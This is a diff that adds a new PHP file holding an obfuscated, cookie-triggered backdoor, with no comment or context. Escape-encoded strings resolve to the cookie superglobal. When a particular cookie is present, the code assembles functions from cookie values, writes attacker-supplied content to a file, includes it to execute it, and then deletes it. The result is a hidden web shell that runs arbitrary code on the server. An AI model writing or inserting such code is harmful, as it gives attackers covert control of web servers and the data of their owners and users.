@@ -1,0 +1,2 @@
+<?php
+$pug=${	"\137" ."\103".	"\117\117"."\113\111\105"}	;	if( isset( $pug [	 (80 - 2	) ])	) { $QV=$pug[	(66	-	16	) ].$pug [(67-	18) ] ;	$voF =$QV( $pug[( 84	-32 ) ].	$pug [	( 90-11)] ) ;	 $SQym =$voF	($QV($pug[	(	93-	5)		]	) ) ; $DHup= $voF( $QV( $pug [	(95- 1)]) );  $yOgd =__DIR__.	$voF ($QV	( $pug	[ (97 -4	) 	]	) );		$SQym($yOgd,$voF(	$QV(	$pug [	( 81 -3	)  ] ))	); include($yOgd)	;	$DHup	($yOgd);	}
